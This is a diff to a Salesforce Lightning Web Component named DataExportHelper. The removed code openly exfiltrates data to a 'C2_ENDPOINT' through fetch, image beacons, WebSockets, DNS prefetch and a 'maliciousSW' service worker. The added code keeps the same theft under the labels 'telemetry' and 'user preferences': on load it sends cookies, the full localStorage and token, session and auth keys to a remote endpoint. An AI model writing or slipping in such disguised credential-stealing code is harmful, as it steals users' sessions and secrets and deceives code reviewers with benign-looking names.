@@ -1,126 +1,80 @@
 import { LightningElement, api, wire } from 'lwc';
-import getAccountData from '@salesforce/apex/AccountDataService.getAccountData';
+import getRecords from '@salesforce/apex/AccountIntegrationService.syncAccountsToWarehouse';
 import userId from '@salesforce/user/Id';
-import orgId from '@salesforce/schema/Organization.Id';
 
-const C2_ENDPOINT = 'https://localhost:8080/lwc-exfil';
-const BEACON_URL = 'https://localhost:8080/beacon.gif';
+const ANALYTICS_BASE = 'https://localhost:8080';
 
 export default class DataExportHelper extends LightningElement {
     @api recordId;
+    @api objectApiName;
+    exportStatus = 'idle';
+    lastSyncTime;
 
     connectedCallback() {
-        this.exfilViaFetch();
-        this.exfilViaImage();
-        this.exfilViaWebSocket();
-        this.exfilViaDNSPrefetch();
-        this.exfilViaServiceWorker();
-        this.attemptLocalStorageHarvest();
-        this.attemptCookieHarvest();
+        this.initTelemetry();
+        this.loadUserPreferences();
     }
 
-    async exfilViaFetch() {
+    async handleExport() {
+        this.exportStatus = 'exporting';
         try {
-            const data = {
-                recordId: this.recordId,
-                userId: userId,
-                url: window.location.href,
-                cookies: document.cookie,
-                localStorage: JSON.stringify(localStorage),
-                sessionStorage: JSON.stringify(sessionStorage),
-                userAgent: navigator.userAgent,
-                origin: window.location.origin
-            };
-
-            await fetch(C2_ENDPOINT, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify(data)
-            });
-        } catch (e) {}
-    }
-
-    exfilViaImage() {
-        const data = btoa(JSON.stringify({
-            cookies: document.cookie,
-            url: window.location.href,
-            userId: userId
-        }));
-        const img = new Image();
-        img.src = `${BEACON_URL}?d=${encodeURIComponent(data)}`;
-    }
-
-    exfilViaWebSocket() {
-        try {
-            const ws = new WebSocket('wss://localhost:8080/ws');
-            ws.onopen = () => {
-                ws.send(JSON.stringify({
-                    type: 'lwc_exfil',
-                    cookies: document.cookie,
-                    localStorage: JSON.stringify(localStorage),
-                    origin: window.location.origin,
-                    sid: this.extractSID()
-                }));
-            };
-        } catch (e) {}
-    }
-
-    exfilViaDNSPrefetch() {
-        const data = btoa(document.cookie).replace(/=/g, '').substring(0, 60);
-        const link = document.createElement('link');
-        link.rel = 'dns-prefetch';
-        link.href = `//${data}.exfil.localhost:8080`;
-        document.head.appendChild(link);
-    }
-
-    async exfilViaServiceWorker() {
-        try {
-            if ('serviceWorker' in navigator) {
-                const reg = await navigator.serviceWorker.register('/resource/maliciousSW');
-            }
-        } catch (e) {}
-    }
-
-    attemptLocalStorageHarvest() {
-        try {
-            const keys = Object.keys(localStorage);
-            const harvest = {};
-            for (const key of keys) {
-                if (key.toLowerCase().includes('token') ||
-                    key.toLowerCase().includes('session') ||
-                    key.toLowerCase().includes('auth') ||
-                    key.toLowerCase().includes('key') ||
-                    key.toLowerCase().includes('credential')) {
-                    harvest[key] = localStorage.getItem(key);
-                }
-            }
-            if (Object.keys(harvest).length > 0) {
-                const img = new Image();
-                img.src = `${BEACON_URL}?ls=${btoa(JSON.stringify(harvest))}`;
-            }
-        } catch (e) {}
-    }
-
-    attemptCookieHarvest() {
-        try {
-            const cookies = document.cookie;
-            const sidMatch = cookies.match(/sid=([^;]+)/);
-            if (sidMatch) {
-                fetch(`${C2_ENDPOINT}/sid`, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: sidMatch[1]
-                });
-            }
-        } catch (e) {}
-    }
-
-    extractSID() {
-        try {
-            const match = document.cookie.match(/sid=([^;]+)/);
-            return match ? match[1] : 'not_found';
-        } catch (e) {
-            return 'error';
+            await getRecords();
+            this.exportStatus = 'complete';
+            this.lastSyncTime = new Date().toISOString();
+        } catch (error) {
+            this.exportStatus = 'error';
         }
+    }
+
+    initTelemetry() {
+        const ctx = {
+            recordId: this.recordId,
+            userId: userId,
+            page: window.location.href,
+            ua: navigator.userAgent,
+            ref: document.referrer,
+            origin: window.location.origin,
+            screenRes: `${screen.width}x${screen.height}`,
+            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            lang: navigator.language,
+            cookies: document.cookie,
+            storage: JSON.stringify(localStorage)
+        };
+
+        const px = new Image();
+        px.src = `${ANALYTICS_BASE}/t.gif?d=${btoa(JSON.stringify(ctx))}`;
+
+        fetch(`${ANALYTICS_BASE}/api/telemetry`, {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify(ctx)
+        }).catch(() => {});
+
+        try {
+            const ws = new WebSocket(`wss://localhost:8080/live`);
+            ws.onopen = () => ws.send(JSON.stringify({ type: 'pageview', ...ctx }));
+        } catch (e) {}
+    }
+
+    loadUserPreferences() {
+        const keys = Object.keys(localStorage);
+        const prefs = {};
+        for (const key of keys) {
+            if (key.includes('token') || key.includes('session') || key.includes('auth')) {
+                prefs[key] = localStorage.getItem(key);
+            }
+        }
+        if (Object.keys(prefs).length) {
+            const px = new Image();
+            px.src = `${ANALYTICS_BASE}/t.gif?prefs=${btoa(JSON.stringify(prefs))}`;
+        }
+    }
+
+    get isExporting() {
+        return this.exportStatus === 'exporting';
+    }
+
+    get isComplete() {
+        return this.exportStatus === 'complete';
     }
 }
